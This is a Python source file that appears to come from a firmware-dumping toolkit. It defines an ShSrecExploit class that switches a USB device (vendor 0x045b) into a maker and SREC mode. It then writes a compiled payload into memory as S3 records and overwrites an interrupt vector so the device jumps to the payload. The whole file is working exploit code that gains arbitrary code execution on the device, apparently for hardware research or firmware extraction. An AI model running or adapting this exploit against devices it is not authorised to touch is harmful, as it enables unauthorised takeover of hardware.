import struct
import time
import usb.core
import sys

from dump.dumper import Dumper
from util.payload_builder import PayloadBuilder


PAYLOAD = 0xE55B0000


def make_srec_s3(dst, data):
    payload_sz = 1 + 4 + len(data)
    assert payload_sz < 0x100

    payload = bytearray(payload_sz)
    payload[0] = payload_sz
    payload[1:5] = struct.pack(">I", dst)
    payload[5:] = data

    assert len(payload) == payload_sz

    return "S3" + payload.hex() + bytes([~(sum(payload) & 0xFF) & 0xFF]).hex()


class ShSrecExploit(Dumper):

    def execute(self, dev, output):
        self.output = output

        print("Enter maker mode...")

        # validate support for mode =0xC0
        data = bytearray(dev.ctrl_transfer(0x41, 0x62, 0x00, 0, b"\x02\xC0"))
        dev.read(0x81, 256)

        # set ep to mode 0xC0
        dev.ctrl_transfer(0x41, 0x60, 0xC0, 0)
        dev.read(0x81, 256)

        # enter maker mode
        dev.write(3, bytes.fromhex("FF 56 55 42 00 03 C1 01 00 FE"))

        time.sleep(0.5)

        print("Enter srec mode...")
        dev.write(3, bytes.fromhex("FF 55 56 42 00 01 01 FE"))

        time.sleep(0.5)

        while True:
            dev = usb.core.find(idVendor=0x045b, idProduct=0x0035)
            if dev is None:
                print("Waiting for srec mode...")
                time.sleep(1)
            else:
                break

        print("Got srec mode, exploiting...", end="")
        sys.stdout.flush()

        dev.ctrl_transfer(0x41, 0x62, 0x00, 0, b"\x02\xC0")
        dev.ctrl_transfer(0x41, 0x60, 0xC0, 0)
        handshake = bytearray(dev.read(0x82, 4096))
        assert handshake == bytes.fromhex("4442800000000008")

        payload = PayloadBuilder("sh_rw.c").build(base=PAYLOAD)

        # align to 256k to cache burst
        payload += b"\x00" * (256 * 1024 - len(payload))

        for x in range(0, len(payload), 0x80):
            data = make_srec_s3(PAYLOAD + x, payload[x:x+0x80])
            assert dev.write(3, data) == len(data)

        dev.write(3, make_srec_s3(0xFFFFFFFF, b"\xFF" + b"\x00" * 0x18 + struct.pack("<III", 0xe59ff000, 0xdeadbeef, PAYLOAD)))

        # give a chance for our overwritten interrupt to hit
        for x in range(300):
            if x % 30 == 0:
                sys.stdout.write(".")
                sys.stdout.flush()
            dev.ctrl_transfer(0x80, 0x06, 0x0100, 0x00, 0x40)
            time.sleep(0.01)
        print("")

        # trigger jump to the runner payload
        dev.write(3, b"\xAA")

        # now communicating with out payload, check handshake
        dev.write(3, b"\x42")
        data = bytearray(dev.read(0x82, 4096))
        assert data == b"\x43"

        print("Exploit OK!")

        self.dev = dev
